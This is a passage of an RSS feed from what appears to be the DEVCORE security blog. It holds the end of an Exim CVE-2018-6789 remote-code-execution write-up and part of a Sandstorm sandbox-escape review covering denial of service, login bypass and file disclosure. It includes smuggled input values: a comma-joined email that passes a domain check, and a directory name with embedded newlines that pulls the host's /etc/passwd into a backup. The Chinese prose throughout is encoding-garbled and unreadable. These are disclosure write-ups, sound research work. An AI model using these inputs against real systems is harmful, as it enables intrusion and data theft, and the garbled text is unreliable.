 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_helo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_quit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_rcpt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;These pointers are initialized at the beginning of exim process, set according to the configure. For example, if there is a line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_smtp_mail = acl_check_mail&lt;/code&gt; in the configure, the pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_smtp_mail&lt;/code&gt; points to the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_check_mail&lt;/code&gt;. Whenever MAIL FROM is used, exim performs an ACL check, which expands &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_check_mail&lt;/code&gt; first. While expanding, exim tries to execute commands if it encounters &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;${run{cmd}}&lt;/code&gt;, so we achieve code execution as long as we control the ACL strings. In addition, we do not need to hijack program control flow directly and therefore we can bypass mitigations such as &lt;strong&gt;PIE&lt;/strong&gt; (Position Independent Executables), &lt;strong&gt;NX&lt;/strong&gt; easily.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reset storeblocks and retrieve the ACL storeblock
 Now the ACL storeblock is in the linked list chain. It will be released once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset()&lt;/code&gt; is triggered, and then we can retrieve it again by allocating multiple blocks.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Overwrite ACL strings and trigger ACL check
 Finally, we overwrite the whole block containing ACL strings. Now we send commands such as EHLO, MAIL, RCPT to trigger ACL checks. Once we touch an acl defined in the configure, we achieve remote code execution.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;
&lt;p&gt;Upgrade to 4.90.1 or above&lt;/p&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;5 February, 2018 09:10 Reported to Exim&lt;/li&gt;
  &lt;li&gt;6 February, 2018 23:23 CVE received&lt;/li&gt;
  &lt;li&gt;10 February, 2018 18:00 Patch released&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
&lt;p&gt;Vulnerabilities found by Meh, DEVCORE research team.
meh [at] devco [dot] re&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;https://exim.org/static/doc/security/CVE-2018-6789.txt
https://git.exim.org/exim.git/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6789
http://www.openwall.com/lists/oss-security/2018/02/07/2&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;heap_exp&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;heap-exploitation-materials-return&quot;&gt;Heap exploitation materials &lt;a href=&quot;#back&quot;&gt;[return]&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://heap-exploitation.dhavalkapil.com/&quot;&gt;Heap Exploitation&lt;/a&gt;: A tutorial of heap exploitation by Dhaval Kapil&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/shellphish/how2heap&quot;&gt;how2heap&lt;/a&gt;: A repo for learning heap exploitation by Shellphish&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400&quot;&gt;Heap exploitation&lt;/a&gt;: (Chinese) A slide introducing basic glibc heap exploitation by Angelboy&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/advanced-heap-exploitaion&quot;&gt;Advanced heap exploitation&lt;/a&gt;: (Chinese) A slide of advanced heap exploitation techniques by Angelboy&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.tw/2014/08/the-poisoned-nul-byte-2014-edition.html&quot;&gt;The poisoned NUL byte&lt;/a&gt;: An article of Null byte off-by-one exploitation by Project Zero&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</link>
                <guid>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en</guid>
                <pubDate>Tue, 06 Mar 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>‰∏ÄÊ¨°Âú® Sandstorm Ë∑≥ËÑ´Ê≤ôÁÆ±ÁöÑÊª≤ÈÄèÁ∂ìÈ©ó</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;‰∏ÄÊ¨°Âú® Sandstorm Ë∑≥ËÑ´Ê≤ôÁÆ±ÁöÑÊª≤ÈÄèÁ∂ìÈ©ó&lt;/a&gt; (‰∏≠ÊñáÁâàÊú¨)&lt;/p&gt;

&lt;h2 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h2&gt;

&lt;p&gt;2017 Âπ¥ÂàùÔºåÊàëÂÄëÊúâÂÄãÊª≤ÈÄèÊ∏¨Ë©¶Â∞àÊ°àÔºåÂ∞àÊ°àÁöÑÊ®ôÁöÑÊû∂ÊßãÂú® &lt;a href=&quot;https://sandstorm.io/&quot;&gt;Sandstorm&lt;/a&gt; ‰πã‰∏ä„ÄÇSandstorm ÊòØ‰∏ÄÊ¨æ Web Âπ≥Âè∞Ôºå‰ΩøÁî®ËÄÖÂèØ‰ª•ËºïÊòìÁöÑÂú®Ë©≤Âπ≥Âè∞ÂÆâË£ùÂêÑÁ®Æ Web AppÔºàÂ¶Ç WordPress„ÄÅGitLab‚Ä¶ÔºâÔºåË©≤Âπ≥Âè∞ÊúÄÂ§ßÁöÑÁâπËâ≤Âú®ÊñºÈÄô‰∫õ App ÈÉΩÊòØÂú®Ê≤ôÁÆ±‰∏≠Âü∑Ë°å„ÄÇÂõ†Ê≠§ÔºåÂç≥‰ΩøÊàëÂÄëÊ∏¨Ë©¶‰∏≠ÊâæÂà∞Â§öÈ†Ö App Âº±ÈªûÔºå‰πüÁÑ°Ê≥ïÂ∞çÂπ≥Âè∞Êú¨Ë∫´ÈÄ†ÊàêÂ®ÅËÑÖ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁÇ∫‰∫ÜËÆìÂº±ÈªûÊïàÁõäÊúÄÂ§ßÂåñÔºåÊàëÂÄëÂ∞á‰∏ÄÈÉ®ÂàÜÁ≤æÂäõËΩâÁßªÂà∞Á†îÁ©∂ Sandstorm ÂéüÂßãÁ¢ºÔºåÁõÆÁöÑÊòØË∑≥ËÑ´ App ÁöÑÊ≤ôÁÆ±Áí∞Â¢ÉÁúãÊúâÊ≤íÊúâÊ©üÊúÉÂΩ±ÈüøÊï¥Âè∞‰º∫ÊúçÂô®„ÄÇÊúÄÂæåÔºåÊàëÂÄëÊâæÂà∞‰∫ÜÂπæÂÄãÂ∞ëË¶ã‰∏îÊúâË∂£ÁöÑÂº±ÈªûÔºå‰∏¶Áî≥Ë´ã CVE Á∑®ËôüÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÈòªÊñ∑ÊúçÂãôÊîªÊìäÔºàDenial of ServiceÔºâÔºåCVE-2017-6198&lt;/li&gt;
  &lt;li&gt;ÁπûÈÅéÊéàÊ¨äÊ®°ÂºèÔºàBypassing Authorization SchemaÔºâÔºåCVE-2017-6199&lt;/li&gt;
  &lt;li&gt;‰∏çÂÆâÂÖ®ÁöÑÁõ¥Êé•Â≠òÂèñÁâ©‰ª∂ÔºàInsecure Direct Object ReferencesÔºâÔºåCVE-2017-6200&lt;/li&gt;
  &lt;li&gt;ÊúçÂãôÁ´ØË´ãÊ±ÇÂÅΩÈÄ†ÔºàServer-Side Request ForgeryÔºâÔºåCVE-2017-6201&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ÊºèÊ¥ûÁ¥∞ÁØÄ&quot;&gt;ÊºèÊ¥ûÁ¥∞ÁØÄ&lt;/h2&gt;

&lt;h3 id=&quot;cve-2017-6198&quot;&gt;CVE-2017-6198&lt;/h3&gt;

&lt;p&gt;ÈÄôÊòØ‰∏ÄÂÄãÊ∂àËÄóÁ≥ªÁµ±Ë≥áÊ∫êÈÄ†ÊàêÁöÑ DoS„ÄÇËµ∑Âõ†ÊòØ Sandstorm ‰∏¶Êú™ÂÆåÂñÑÈôêÂà∂ÊØèÂÄã App ÊâÄËÉΩ‰ΩøÁî®ÁöÑË≥áÊ∫êÔºåÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/sandstorm/supervisor.c++&lt;/code&gt; ÂÉÖÈôêÂà∂‰∫ÜÊØèÂÄãÁ®ãÂ∫èËÉΩÂ§†ÊâìÈñãÁöÑÊúÄÂ§öÊ™îÊ°àÊï∏ÔºåÁõ∏ÈóúÁ®ãÂºèÁ¢ºÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SupervisorMain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setResourceLimits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rlimit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;KJ_SYSCALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_NOFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Áî±Êñº supervisor Êú™ÈôêÂà∂Â≠êÁ®ãÂ∫èÊï∏Èáè‰ª•ÂèäÊú™ÈôêÂà∂ÂÑ≤Â≠òÁ©∫ÈñìÁî®ÈáèÔºåÂõ†Ê≠§ÊîªÊìäËÄÖÂè™Ë¶ÅËÆì App ‰∏çÊñ∑Âü∑Ë°å forkÔºàÈÄöÂ∏∏Á®±ÁÇ∫ Fork BombÔºâÊàñÊòØÂ§ßÈáè‰ΩøÁî®Á°¨Á¢üÁ©∫ÈñìÔºåÂ∞±ÊúÉÈÄ†Êàê‰º∫ÊúçÂô®Ë≥áÊ∫ê‰∏çË∂≥ËÄå‰∏≠Êñ∑ÊúçÂãô„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6199&quot;&gt;CVE-2017-6199&lt;/h3&gt;

&lt;p&gt;ÈÄöÂ∏∏ Sandstorm ÊúÉË®≠ÂÆöÁâπÂÆöÁµÑÁπîÊàêÂì°ÊâçËÉΩÊìÅÊúâÁâπÊÆäÁöÑÊ¨äÈôêÔºåËÄåÁ≥ªÁµ±È†êË®≠ÁöÑÁµÑÁπîÊàêÂì°Âà§Êñ∑ÊñπÂºèÊòØÊ™¢Êü•‰ΩøÁî®ËÄÖ email ‰∏≠„Äå@„ÄçÁ¨¶ËôüÊúÄÂæåÁöÑÂ≠ó‰∏≤ÊòØÂê¶Âú®ÁôΩÂêçÂñÆÂÖßÔºåÁõ∏ÈóúÁ®ãÂºèÁ¢ºÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;identity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;emailDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âõ†Ê≠§ÔºåÁï∂ÊîªÊìäËÄÖÂ°´ÂÖ•ÁöÑ email ÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt;ÔºåÁ≥ªÁµ±‰æøÊúÉÂ∞áÊîªÊìäËÄÖË¶ñÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; ÁµÑÁπîÁöÑ‰ΩøÁî®ËÄÖ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÈ†ÖÊîªÊìäÂæó‰ª•ÊàêÂäüÈÇÑÊúâÂè¶Â§ñ‰∏ÄÂÄãÈóúÈçµÈªûÔºåÁôºÁîüÂú® Sandstorm ÁôªÂÖ•ÁöÑ‰∏ÄÂÄãÁâπËâ≤‰∏ä„ÄÇ‰ΩøÁî® Sandstorm ÊúçÂãô‰∏çÈúÄË¶ÅË®≠ÂÆöÂØÜÁ¢ºÔºå‰ΩøÁî®ËÄÖÊØèÊ¨°Ê¨≤ÁôªÂÖ•ÊôÇÂ°´ÂÖ• emailÔºåÁ≥ªÁµ±‰æøÊúÉÁôºÈÄÅ‰∏ÄÁµÑÊØèÊ¨°ÁöÜ‰∏çÂêåÁöÑÈö®Ê©üÂØÜÁ¢º‰ΩúÁÇ∫ÁôªÂÖ•‰ΩøÁî®„ÄÇ‰∏äËø∞ÁöÑ‰æãÂ≠ê‰πãÊâÄ‰ª•ËÉΩÂ§†ÊàêÂäüÔºåÂ∞±ÊòØÂõ†ÁÇ∫Á≥ªÁµ±Â∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; Ë¶ñÁÇ∫‰∏ÄÂÄã aaa.bbb Á∂≤ÂüüÁöÑ‰ΩøÁî®ËÄÖÔºåËÄåÈö®Ê©üÂØÜÁ¢ºÊúÉÁôºÈÄÅÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re&lt;/code&gt; ‰ª•Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ccc@aaa.bbb&lt;/code&gt; ÂÖ©ÂÄã‰∏çÂêå‰ø°ÁÆ±‰∏≠ÔºåÂè™Ë¶ÅÂèØ‰ª•Êî∂Âà∞ÂØÜÁ¢ºÂ∞±ÂèØ‰ª•ÁôªÂÖ•‰ΩøÁî®ÊúçÂãô„ÄÇ&lt;/p&gt;

&lt;p&gt;Áõ¥Êé•Ê°à‰æãË™™ÊòéÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Âú® Sandstorm ÈôêÂÆöÂè™ÊúâÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; Á∂≤ÂüüÊâçÂèØ‰ª•ÁôªÂÖ•„ÄÇ
&lt;img src=&quot;/assets/img/blog/20180126/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ÁôªÂÖ•Ëôï email Ê¨Ñ‰ΩçÂ°´ÂÖ• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt;„ÄÇÔºàË®ªÔºöemail Ê¨Ñ‰ΩçÂú®ÂâçÁ´ØÊúâÁî® HTML5 ValidationÔºå‰ΩÜÂæåÁ´Ø‰∏¶ÁÑ°Ê™¢Êü• email ÊòØÂê¶ÂêàÊ≥ïÔºâ
&lt;img src=&quot;/assets/img/blog/20180126/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Âú® demo@devco.re ‰ø°ÁÆ±Êî∂Âà∞Èö®Ê©üÂØÜÁ¢º„ÄÇ
&lt;img src=&quot;/assets/img/blog/20180126/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ÊàêÂäüÁôªÂÖ•Ôºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; Ë¢´Ë¶ñÁÇ∫‰∏ÄÂÄã‰ΩøÁî®ËÄÖÔºå‰∏îÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; ÁµÑÁπîÊàêÂì°ÔºÅ
&lt;img src=&quot;/assets/img/blog/20180126/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Âú®ÊàëÂÄëÁöÑÊª≤ÈÄèÊ∏¨Ë©¶‰∏≠ÔºåÊ®ôÁöÑÁ∂≤Á´ôÊòØÂÖÅË®±Ë™çË≠âÁöÑÁ∂≤Âüü‰ΩøÁî®ËÄÖËá™Ë°åÂÆâË£ù App ÁöÑ„ÄÇÂõ†Ê≠§ÈÄèÈÅéÈÄôÈ†ÖÁπûÈÅéÂº±ÈªûÔºåÊîªÊìäËÄÖÂèØ‰ª•ÂÜçÊê≠ÈÖçÊú¨ÁØáÂÖ∂‰ªñÊºèÊ¥ûÔºàCVE-2017-6198„ÄÅCVE-2017-6200„ÄÅCVE-2017-6201ÔºâÂÅöÊõ¥ÈÄ≤‰∏ÄÊ≠•ÁöÑÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6200&quot;&gt;CVE-2017-6200&lt;/h3&gt;

&lt;p&gt;ÈÄôÊòØ‰∏ÄÂÄãÊúâË∂£ÁöÑÂº±ÈªûÔºåÁ∏ΩÂÖ±ÁµÑÂêà‰∫ÜÂÖ©ÂÄãÈ©óË≠â‰∏äÁöÑÂ∞èÁñèÂøΩÊâçËÉΩÈÅîÊàêÊîªÊìäÔºÅ
Âú® Sandstorm ‰∏≠ÊØèÂÄã GrainÔºàSandstorm containerÔºåÁ∞°ÂñÆ‰æÜË™™Â∞±ÊòØ‰∏ÄÂÄã App Ê≤ôÁÆ±ÔºâÁöÑÊìÅÊúâËÄÖÈÉΩÂèØ‰ª•‰∏ãËºâË©≤ App ÁöÑÂÇô‰ªΩË≥áÊñôÔºå‰ΩÜÁî±ÊñºÊâìÂåÖÊµÅÁ®ã‰∏≠Â≠òÂú®ÂÖ©ÂÄãÂº±ÈªûÔºåÂõ†Ê≠§ÊîªÊìäËÄÖÂèØ‰ª•ÊâìÂåÖÊ≤ôÁÆ±Â§ñ‰º∫ÊúçÂô®ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; Âíå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; ‰∏ãÁöÑÊ™îÊ°à„ÄÇÁôºÁîüÁöÑÂïèÈ°åÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;ÊâìÂåÖÁöÑÊµÅÁ®ãÈö±Ëóè‰∫Ü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt;„ÄÅ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc&lt;/code&gt;„ÄÅ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; Á≠âÊïèÊÑüÁõÆÈåÑÔºåÂçªÊ≤íÊúâÈö±Ëóè &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc.host&lt;/code&gt; Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run.host&lt;/code&gt; ÈÄôÂÖ©ÂÄãÁõÆÈåÑ„ÄÇÈÄôÂÖ©ÂÄãÁõÆÈåÑÂàÜÂà•ÊòØ‰º∫ÊúçÂô®‰∏ã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; Âíå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; ÁöÑÂà•ÂêçÔºåÊòØËºÉÂæåÊúüÁöÑÂäüËÉΩ„ÄÇ&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Á≥ªÁµ±ÊúÉÂ∞áÊ¨≤ÊâìÂåÖÁöÑÂêàÊ≥ïÊ™îÊ°àÊï¥ÁêÜÂá∫‰æÜÈÄèÈÅéÊ®ôÊ∫ñËº∏ÂÖ•‰ªãÈù¢ÂÇ≥Áµ¶ zip ÊâìÂåÖÔºåËÄåÂà§Êñ∑Ê™îÊ°àÂíåÊ™îÊ°àÈñìÁöÑÂçÄÈöîÊòØÈù†ÊèõË°åÁ¨¶Ëôü(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\n&lt;/code&gt;)„ÄÇÂõ†Ê≠§ÔºåÁï∂Ê™îÂêç‰∏≠Âá∫ÁèæÊèõË°åÁ¨¶ËôüÔºåÂèØ‰ª•ÊèíÂÖ•ÈùûÊ≥ïÁöÑË∑ØÂæëÊ™îÂêçËóâÁî± zip ÊâìÂåÖ„ÄÇÁ®ãÂºèÈõñÁÑ∂ÊúâÊ™¢Êü•Ê™îÂêçÊòØÂê¶Â≠òÂú®ÊèõË°åÁ¨¶ÔºåÂçªÁñèÂøΩ‰∫ÜÊ™¢Êü•ÁõÆÈåÑÂêç„ÄÇ&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Á∂úÂêà‰∏äËø∞ÂÖ©ÂÄãÂº±ÈªûÔºåÊîªÊìäËÄÖÂè™Ë¶ÅÂú®Ê≤ôÁÆ±ÂÖßÂª∫Á´ã‰∏ÄÂÄãÁõÆÈåÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;ÔºåÂ∞±ÂèØ‰ª•ÈÄèÈÅé‰∏ãËºâÂÇô‰ªΩÁöÑÂäüËÉΩÂèñÂæóÂê´Êúâ‰º∫ÊúçÂô® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; Ê™îÊ°àÁöÑÂÇô‰ªΩÊ™î„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂØ¶ÈöõÊÉÖÂ¢ÉÊà™ÂúñÔºö&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;ÂÖàÂú® Grain Ë£°Êñ∞Âª∫ÁõÆÈåÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;Ôºå‰∏¶Áî® Grain Backup ÁöÑÂäüËÉΩ‰∏ãËºâÂÇô‰ªΩÊ™î„ÄÇ
&lt;img src=&quot;/assets/img/blog/20180126/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Ëß£ÈñãÂÇô‰ªΩÊ™îÂæåÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etc.host&lt;/code&gt; ÁõÆÈåÑ‰∏ãÁúãÂà∞Ê≤ôÁÆ±Â§ñ‰º∫ÊúçÂô®ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;
&lt;img src=&quot;/assets/img/blog/20180126/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;cve-2017-6201&quot;&gt;CVE-2017-6201&lt;/h3&gt;

